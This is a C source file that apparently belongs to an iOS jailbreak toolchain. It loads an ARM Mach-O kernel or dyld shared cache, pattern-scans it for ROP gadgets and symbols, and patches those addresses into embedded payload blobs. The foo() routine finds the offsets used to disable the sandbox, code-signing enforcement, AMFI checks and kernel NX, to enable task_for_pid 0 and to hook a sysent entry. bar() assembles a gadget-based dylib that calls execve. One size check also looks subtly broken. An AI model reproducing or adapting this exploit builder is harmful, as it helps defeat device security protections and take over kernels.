#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <unistd.h>
#include "loader.h"
#include "nlist.h"
#include "fat.h"
#include "dyld_cache_format.h"

extern unsigned char pf2_bin[], one_bin[];
extern unsigned int pf2_bin_len, one_bin_len;

typedef uint32_t addr_t;
typedef struct { addr_t start; size_t size; } range_t;
typedef uintptr_t paddr_t;
typedef struct { void *start; size_t size; } prange_t;

void *load_base;
bool loaded_in_place;

inline void *addrconv(addr_t addr) {
    if(loaded_in_place) {
        return (void *) (intptr_t) addr;
    } else {
        return (void *) ((char *)load_base + (addr & 0x0fffffff));
    }
}

int desired_cputype = 12; // ARM
int desired_cpusubtype = 9; // v7=9, v6=6

// global data:

int dyld_fd;
struct dyld_cache_header dyld_hdr;
uint32_t dyld_mapping_count;
struct shared_file_mapping_np *dyld_mappings;

struct mach_header *mach_hdr;

struct nlist *symtab;
uint32_t nsyms;
char *strtab;
uint32_t strsize;

#define CMD_ITERATE(hdr, cmd) for(struct load_command *cmd = (void *)((hdr) + 1), *end = (void *)((char *)(hdr) + (hdr)->sizeofcmds); cmd < end; cmd = (void *)((char *)(cmd) + cmd->cmdsize))

#define die(fmt, args...) do { fprintf(stderr, fmt, ##args); abort(); } while(0)
#define edie(fmt, args...) die(fmt, ##args, strerror(errno))

void *macho_offconv(uint32_t fileoff) {
    CMD_ITERATE(mach_hdr, cmd) {
        if(cmd->cmd == LC_SEGMENT) {
            struct segment_command *scmd = (void *) cmd;
            if(fileoff >= scmd->fileoff && fileoff < scmd->fileoff + scmd->filesize) {
                return addrconv(scmd->vmaddr + fileoff - scmd->fileoff);
            }
        }
    }
    die("offconv: file offset %u not in segment\n", fileoff);
}

void macho_load_symbols() {
    bool dysymtab = false;
    uint32_t iextdefsym, nextdefsym;
    CMD_ITERATE(mach_hdr, cmd) {
        if(cmd->cmd == LC_SYMTAB) {
            struct symtab_command *scmd = (void *) cmd;
            if(scmd->nsyms >= 0x1000000) {
                die("macho_load_symbols: ridiculous number of symbols (%u)\n", scmd->nsyms);
            }
            // possible crash
            nsyms = scmd->nsyms;
            strsize = scmd->strsize;
            symtab = macho_offconv(scmd->symoff);
            strtab = macho_offconv(scmd->stroff);
        } else if(cmd->cmd == LC_DYSYMTAB) {
            struct dysymtab_command *dcmd = (void *) cmd;
            iextdefsym = dcmd->iextdefsym;
            nextdefsym = dcmd->nextdefsym;
            dysymtab = true;
        } else if(cmd->cmd == LC_DYLD_INFO_ONLY) {
            fprintf(stderr, "macho_load_symbols: warning: file is fancy, symbols might be missing\n");
        }
    }
    if(symtab && dysymtab) {
        if(iextdefsym >= nsyms) {
            die("macho_load_symbols: bad iextdefsym (%u)\n", iextdefsym);
        }
        if(nextdefsym > nsyms - iextdefsym) {
            die("macho_load_symbols: bad nextdefsym (%u)\n", nextdefsym);
        }
        symtab += iextdefsym;
        nsyms = nextdefsym;
    }
}

void load_macho(const char *path) {
    int fd = open(path, O_RDONLY);
    if(fd == -1) { 
        edie("load_macho(%s): could not open: %s\n", path);
    }
    void *fhdr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(fhdr == MAP_FAILED) {
        edie("load_macho(%s): could not map file header: %s\n", path);
    }
    uint32_t magic = *(uint32_t *)fhdr;
    uint32_t fat_offset;
    if(magic == MH_MAGIC) {
        // thin file
        mach_hdr = fhdr;
        fat_offset = 0;
        if(mach_hdr->cputype != desired_cputype || (mach_hdr->cpusubtype != 0 && desired_cpusubtype != 0 && mach_hdr->cpusubtype != desired_cpusubtype)) {
            die("load_macho(%s): thin file doesn't have the right architecture\n", path);
        }
    } else if(magic == FAT_MAGIC) {
        if(desired_cpusubtype == 0) {
            die("load_macho(%s): fat, but we don't even know what we want\n", path);
        }
        struct fat_header *fathdr = fhdr;
        struct fat_arch *arch = (void *)(fathdr + 1);
        uint32_t nfat_arch = fathdr->nfat_arch;
        if(sizeof(struct fat_header) + nfat_arch * sizeof(struct fat_arch) >= 4096) {
            die("load_macho(%s): fat header is too big\n", path);
        }
        while(nfat_arch--) {
            if(arch->cputype == desired_cputype && (arch->cpusubtype == 0 || arch->cpusubtype == desired_cpusubtype)) {
                munmap(fhdr, 4096);
                fat_offset = arch->offset;
                mach_hdr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, fat_offset);
                if(mach_hdr == MAP_FAILED) {
                    edie("load_macho(%s): could not map mach-o header from fat file: %s\n", path);
                }
                break;
            }
            arch++;
        }
    } else {
        die("load_macho: (%08x) what is this I don't even", magic);
    }
            
    if(mach_hdr->sizeofcmds > sizeof(*mach_hdr) + mach_hdr->sizeofcmds >= 4096) {
        die("load_macho(%s): sizeofcmds is too big\n", path);
    }

    symtab = NULL;

    CMD_ITERATE(mach_hdr, cmd) {
        if(cmd->cmd == LC_SEGMENT) {
            struct segment_command *scmd = (void *) cmd;
            if(scmd->vmsize == 0) scmd->filesize = 0; // __CTF
            if(scmd->filesize != 0 && !loaded_in_place) {
                if(mmap(addrconv(scmd->vmaddr), scmd->filesize, PROT_READ, MAP_SHARED | MAP_FIXED, fd, fat_offset + scmd->fileoff) == MAP_FAILED) {
                    edie("load_macho(%s): could not map segment %.16s at %u+%u,%u: %s\n", path, scmd->segname, scmd->fileoff, fat_offset, scmd->filesize);
                }
            }
        }
    }
    
    macho_load_symbols();
}

void load_dyld_cache(const char *path) {
    int fd = open(path, O_RDONLY);
    if(fd == -1) { 
        edie("load_dyld_cache(%s): could not open: %s\n", path);
    }
    if(read(fd, &dyld_hdr, sizeof(dyld_hdr)) != sizeof(dyld_hdr)) {
        die("load_dyld_cache(%s): truncated\n", path);
    }
    if(memcmp(dyld_hdr.magic, "dyld", 4)) {
        die("load_dyld_cache(%s): not a dyld cache\n", path);
    }
    if(dyld_hdr.mappingCount > 1000) {
        die("load_dyld_cache(%s): insane mapping count\n", path);
    }
    dyld_mapping_count = dyld_hdr.mappingCount;
    size_t sz = dyld_hdr.mappingCount * sizeof(struct shared_file_mapping_np);
    dyld_mappings = malloc(sz);
    if(pread(fd, dyld_mappings, sz, dyld_hdr.mappingOffset) != sz) {
        edie("load_dyld_cache(%s): could not read mappings: %s\n", path);
    }
    if(!loaded_in_place) {
        for(int i = 0; i < dyld_mapping_count; i++) {
            struct shared_file_mapping_np mapping = dyld_mappings[i];
            if(mmap(addrconv((addr_t) mapping.sfm_address), (size_t) mapping.sfm_size, PROT_READ, MAP_SHARED | MAP_FIXED, fd, (off_t) mapping.sfm_file_offset) == MAP_FAILED) {
                edie("load_dyld_cache(%s): could not map segment %d of this crappy binary format\n", path, i);
            }
        }
    }
    dyld_fd = fd;
}

range_t dyld_nth_segment(int n) {
    if(n < dyld_mapping_count) {
        return (range_t) {(addr_t) dyld_mappings[n].sfm_address, (size_t) dyld_mappings[n].sfm_size};
    } else {
        return (range_t) {0, 0};
    }
}

// return value is |1 if to_execute is set and there is a thumb symbol
addr_t sym(const char *name, bool to_execute) {
    if(!symtab) {
        die("sym: we wanted %s but there is no symbol table\n", name);
    }
    // I stole dyld's codez
    const struct nlist *base = symtab;
    for(uint32_t n = nsyms; n > 0; n /= 2) {
        const struct nlist *pivot = base + n/2;
        uint32_t strx = pivot->n_un.n_strx;
        if(strx >= strsize) {
            die("sym: insane strx: %u\n", strx);
        }
        const char *pivot_str = strtab + strx;
        int cmp = strncmp(name, pivot_str, strsize - strx);
        if(cmp == 0) {
            // we found it
            addr_t result = pivot->n_value;
            if(to_execute && (pivot->n_desc & N_ARM_THUMB_DEF)) {
                result |= 1;
            }
            return result;
        } else if(cmp > 0) {
            base = pivot + 1; 
            n--;
        }
    }
    die("sym: symbol %s not found\n", name);
}

range_t macho_segrange(const char *segname) {
    CMD_ITERATE(mach_hdr, cmd) {
        if(cmd->cmd == LC_SEGMENT) {
            struct segment_command *scmd = (void *) cmd;
            if(!strncmp(scmd->segname, segname, 16)) {
                return (range_t) {scmd->vmaddr, scmd->filesize};
            }
        }
    }
    die("macho_segrange: no such segment %s\n", segname);
}

#define r(sz) \
inline uint##sz##_t read##sz(addr_t addr) { \
    return *(uint##sz##_t *)(addrconv(addr)); \
}

r(8)
r(16)
r(32)
r(64)

void checkaddr(range_t range, addr_t addr) {
    if(addr < range.start || addr >= (range.start | range.size)) {
        die("Bad address 0x%08x\n", addr);
    }
}

#define max(a, b) ((a) > (b) ? (a) : (b))
#define min(a, b) ((a) < (b) ? (a) : (b))
// Specify align as 0 if you only expect to find it at one place anyway.
addr_t find_data_int(range_t range, int16_t *buf, ssize_t pattern_size, size_t offset, int align, bool must_find, const char *name) {
    int8_t table[256];
    for(int c = 0; c < 256; c++) {
        table[c] = pattern_size;
    }
    for(int pos = 0; pos < pattern_size - 1; pos++) {
        if(buf[pos] == -1) {
            // Unfortunately, we can't put any character past being in this position...
            for(int i = 0; i < 256; i++) {
                table[i] = pattern_size - pos - 1;
            }
        } else {
            table[buf[pos]] = pattern_size - pos - 1;
        }
    }
    // now, for each c, let x be the last position in the string, other than the final position, where c might appear, or -1 if it doesn't appear anywhere; table[i] is size - x - 1.
    // so if we got c but no match, we can skip ahead by table[i]
    // i.e. lame Boyer–Moore
    // I implemented the other half, but it actually made things /slower/
    buf += pattern_size - 1;
    addr_t foundit = 0;
    uint8_t *start = (uint8_t *)addrconv(range.start) + pattern_size - 1;
    uint8_t *end = (uint8_t *)addrconv(range.start + range.size);
    uint8_t *cursor = start;
    while(cursor < end) {
        for(int i = 0; i >= (-pattern_size + 1); i--) {
            if(buf[i] != -1 && cursor[i] != buf[i]) {
                // Not a match
                goto keep_going;
            }
        }
        // Whoa, we found it
        addr_t new = cursor - start + range.start;
        if(align && (new & (align - 1))) {
            // Just kidding.
            goto keep_going;
        }
        if(foundit) {
            die("find_data_int: Found [%s] multiple times in range: first at %08x then at %08x\n", name, foundit, new);
        }
        foundit = new;
        if(align) {
            break;
        }
        // otherwise, keep searching to make sure we won't find it again
        keep_going:;
        int jump = table[*cursor];
        cursor += jump;
    }
    if(foundit) {
        return foundit + offset;
    } else if(must_find) {
        die("find_data_int: Didn't find [%s] in range\n", name);
    } else {
        return 0;
    }
}

addr_t find_data(range_t range, char *to_find, int align, bool must_find) {
    int16_t buf[128];
    size_t pattern_size = 0;
    size_t offset = -1;
    char *to_find_ = strdup(to_find);
    while(to_find_) {
        char *bit = strsep(&to_find_, " ");
        if(!strcmp(bit, "-")) {
            offset = pattern_size; 
            continue;
        } else if(!strcmp(bit, "+")) {
            offset = pattern_size + 1;
            continue;
        } else if(!strcmp(bit, "..")) {
            buf[pattern_size] = -1;
        } else {
            char *endptr;
            buf[pattern_size] = (int16_t) (strtol(bit, &endptr, 16) & 0xff);
            if(*endptr) {
                die("find_data: invalid bit %s in [%s]\n", bit, to_find);
            }
        }
        if(++pattern_size >= 128) {
            die("find_data: pattern [%s] too big\n", to_find);
        }
    }
    free(to_find_);
    if(offset == -1) {
        die("find_data: pattern [%s] doesn't have an offset\n", to_find);
    }
    return find_data_int(range, buf, pattern_size, offset, align, must_find, to_find);
}

addr_t find_string(range_t range, const char *string, int align, bool must_find) {
    size_t len = strlen(string);
    int16_t *buf = malloc(sizeof(int16_t) * (len + 2));
    buf[0] = buf[len + 1] = 0;
    for(int i = 0; i < len; i++) {
        buf[i+1] = (uint8_t) string[i];
    }
    addr_t result = find_data_int(range, buf, len, 1, align, must_find, string);
    free(buf);
    return result;
}

addr_t find_int32(range_t range, uint32_t number, bool must_find) {
    char *start = addrconv(range.start);
    char *end = addrconv(range.start + range.size - 4);
    for(char *p = start; p < end; p++) {
        if(*((uint32_t *)p) == number) {
            return p - start + range.start;
        }
    }
    if(must_find) {
        die("find_int32: Didn't find %08x in range\n", number);
    } else {
        return 0;
    }
}

void preplace32(prange_t range, uint32_t a, uint32_t b) {
    bool found_it = false;
    for(paddr_t addr = (paddr_t)range.start; addr + sizeof(uint32_t) <= (paddr_t)range.start + range.size; addr++) {
        if(*(uint32_t *)addr == a) {
            *(uint32_t *)addr = b;
            found_it = true;
        }
    }
    if(!found_it) {
        fprintf(stderr, "preplace32: warning: didn't find %08x anywhere\n", a);
    }
}

prange_t pdup(prange_t range) {
    void *buf = malloc(range.size);
    memcpy(buf, range.start, range.size);
    return (prange_t) {buf, range.size};
}

// --


addr_t find_bof(range_t range, addr_t eof, bool is_thumb) {
    // push {..., lr}; add r7, sp, ...
    addr_t addr = (eof - 1) & ~1;
    checkaddr(range, addr);
    if(is_thumb) {
        // xx b5 xx af
        while(!(read8(addr + 1) == 0xb5 && \
                read8(addr + 3) == 0xaf)) {
            addr -= 2;
            checkaddr(range, addr);
        }
    } else {
        // xx xx 2d e9 xx xx 8d e2
        while(!(read16(addr + 2) == 0xe92d && \
                read16(addr + 6) == 0xe28d)) {
            addr -= 4;
            checkaddr(range, addr);
        }
    }
    return addr;
}

uint32_t find_dvp_struct_offset() {
    range_t range = macho_segrange("__PRELINK_TEXT");
    addr_t derive_vnode_path = find_bof(range, find_int32(range, find_string(range, "path", 0, true), true), true);
    switch(read8(find_data((range_t){derive_vnode_path, 1024}, "- .. 69 6a 46", 0, true))) {
    case 0x20:
        return 0x10;
    case 0x60:
        return 0x14;
    default:
        die("couldn't find dvp_struct_offset\n");
        abort();
    }
}

addr_t dyld_find_anywhere(char *to_find, int align) {
    range_t range;
    for(int i = 0; (range = dyld_nth_segment(i)).start; i++) {
        addr_t result = find_data(range, to_find, align, false);
        if(result) return result;
    }
    die("dyld_find_anywhere: Didn't find [%s] /anywhere/\n", to_find);
}

void dyld_load_syms(const char *filename) {
    if(dyld_hdr.imagesCount > 1000) {
        die("dyld_load_syms: insane images count\n");
    }
    for(int i = 0; i < dyld_hdr.imagesCount; i++) {
        struct dyld_cache_image_info info;
        if(pread(dyld_fd, &info, sizeof(info), dyld_hdr.imagesOffset + i * sizeof(struct dyld_cache_image_info)) != sizeof(info)) {
            die("dyld_load_syms: could not read image\n");
        }
        char name[128];
        if(pread(dyld_fd, name, sizeof(name), info.pathFileOffset) <= 0) {
            die("dyld_load_syms: could not read image name\n");
        }
        if(strncmp(name, filename, 128)) {
            continue;
        }
        // we found it; I suppose I should check whether this is a real address
        mach_hdr = addrconv((addr_t) info.address);
        macho_load_symbols();
        return;
    }
}

void write_range(prange_t range, const char *fn) {
    int fd = open(fn, O_WRONLY | O_CREAT, 0644);
    if(fd == -1) {
        edie("write_range: could not open %s: %s\n", fn);
    }
    if(write(fd, range.start, range.size) != range.size) {
        edie("write_range: could not write data to %s: %s\n", fn);
    }
    close(fd);
}

prange_t bar() {
    prange_t the_dylib = pdup((prange_t) {one_bin, one_bin_len});    
    // hexydec
    preplace32(the_dylib, 0xfeed0002, dyld_find_anywhere("+ 54 f8 20 00", 2));
    preplace32(the_dylib, 0xfeed0003, dyld_find_anywhere("+ 00 f0 01 00 80 bd", 2));
    preplace32(the_dylib, 0xfeed0004, dyld_find_anywhere("+ 00 68 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0005, dyld_find_anywhere("+ 20 60 90 bd", 2));
    preplace32(the_dylib, 0xfeed0006, dyld_find_anywhere("+ 20 44 90 bd", 2));
    preplace32(the_dylib, 0xfeed0007, dyld_find_anywhere("+ 0f bd", 2));
    preplace32(the_dylib, 0xfeed0009, dyld_find_anywhere("+ 0e bd", 2));
    preplace32(the_dylib, 0xfeed0010, dyld_find_anywhere("+ a7 f1 00 0d 80 bd", 2));
    preplace32(the_dylib, 0xfeed0011, dyld_find_anywhere("+ f0 bd", 2));
    preplace32(the_dylib, 0xfeed0012, dyld_find_anywhere("+ a0 47 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0014, dyld_find_anywhere("+ 20 58 90 bd", 2));
    preplace32(the_dylib, 0xfeed0015, dyld_find_anywhere("+ 40 f8 04 4b 90 bd", 2));
    preplace32(the_dylib, 0xfeed0016, dyld_find_anywhere("+ 20 68 90 bd", 2));
    preplace32(the_dylib, 0xfeed0017, dyld_find_anywhere("+ 25 60 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0018, dyld_find_anywhere("+ 10 bd", 2));
    preplace32(the_dylib, 0xfeed0019, dyld_find_anywhere("+ 80 bd", 2));
    preplace32(the_dylib, 0xdeadfeed, dyld_find_anywhere("- 00 a0 9b 49", 4));
    dyld_load_syms("/usr/lib/libSystem.B.dylib");
    preplace32(the_dylib, 0xfeed1001, sym("_sysctlbyname", true));
    preplace32(the_dylib, 0xfeed1002, sym("_execve", true));
    return the_dylib;
}

prange_t foo() {
    prange_t pf2 = pdup((prange_t) {pf2_bin, pf2_bin_len});

    // sandbox
    range_t range = macho_segrange("__PRELINK_TEXT");
    addr_t sb_evaluate = find_bof(range, find_int32(range, find_string(range, "bad opcode", false, true), true), true);
    preplace32(pf2, 0xfeed0001, read32(sb_evaluate));
    preplace32(pf2, 0xfeed0002, read32(sb_evaluate + 4));
    preplace32(pf2, 0xfeed0003, sb_evaluate + 9);
    preplace32(pf2, 0xfeed0004, sym("_memcmp", true));
    preplace32(pf2, 0xfeed0005, sym("_vn_getpath", true));
    preplace32(pf2, 0xfeed0006, find_dvp_struct_offset());
    
    // cs_enforcement_disable
    preplace32(pf2, 0xfedd0001, find_data(macho_segrange("__TEXT"), "00 00 00 00 00 00 00 - 00 00 00 00 01 00 00 00 80", 1, true));
    // kernel_pmap->nx_enabled
    preplace32(pf2, 0xfedd0002, sym("_kernel_pmap", false) + 0x420);
    addr_t sysent = find_data(macho_segrange("__DATA"), "21 00 00 00 00 10 86 00 -", 0, true);
    preplace32(pf2, 0xfedd0003, sysent);
    preplace32(pf2, 0xfedd0004, sysent + 4);
    addr_t sysent_patch_orig = read32(sysent);
    preplace32(pf2, 0xfedd0005, sysent_patch_orig);
    // target_addr
    preplace32(pf2, 0xfedd0006, (sysent_patch_orig & 0x00ffffff) | 0x2f000000);
    // vm_map_enter (patch1) - allow RWX pages
    preplace32(pf2, 0xfedd0007, find_data(macho_segrange("__TEXT"), "- 02 0f .. .. 63 08 03 f0 01 05 e3 0a 13 f0 01 03 1e 93", 0, true));
    // AMFI (patch3) - disable the predefined list of executable stuff
    preplace32(pf2, 0xfedd0008, find_data(macho_segrange("__PRELINK_TEXT"), "23 78 9c 45 05 d1 .. .. .. .. .. .. .. 4b 98 47 00 .. -", 0, true));
    // task_for_pid 0
    preplace32(pf2, 0xfedd0009, find_data(macho_segrange("__TEXT"), "85 68 00 23 .. 93 .. 93 - 5c b9", 0, true));
    preplace32(pf2, 0xfedd0010, sym("_flush_dcache", true));
    preplace32(pf2, 0xfedd0011, sym("_invalidate_icache", true));
    preplace32(pf2, 0xfedd0012, sym("_copyin", true));
    preplace32(pf2, 0xfedd0013, sym("_IOLog", true));
    preplace32(pf2, 0xfeed0014, sb_evaluate);;
    return pf2;
}

int main(int argc, char **argv) {
#ifdef __arm__
    loaded_in_place = true; // xxx
#else
    loaded_in_place = false;
#endif
    if(!loaded_in_place) {
        load_base = mmap(NULL, 0x10000000, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);
        if(load_base == MAP_FAILED) {
            edie("main: could not reserve memory: %s\n");
        }
    }
    if(argc > 1 && !strcmp(argv[1], "-c")) {
        load_dyld_cache(argv[2]);
        write_range(bar(), "one.dylib");
    } else if(argc > 1 && !strcmp(argv[1], "-k")) {
        load_macho(argv[2]);
        write_range(foo(), "pf2");
    } else {
        fprintf(stderr, "Usage: data -c cache | -k kernel\n");
        return 1;
    }
    return 0;
}
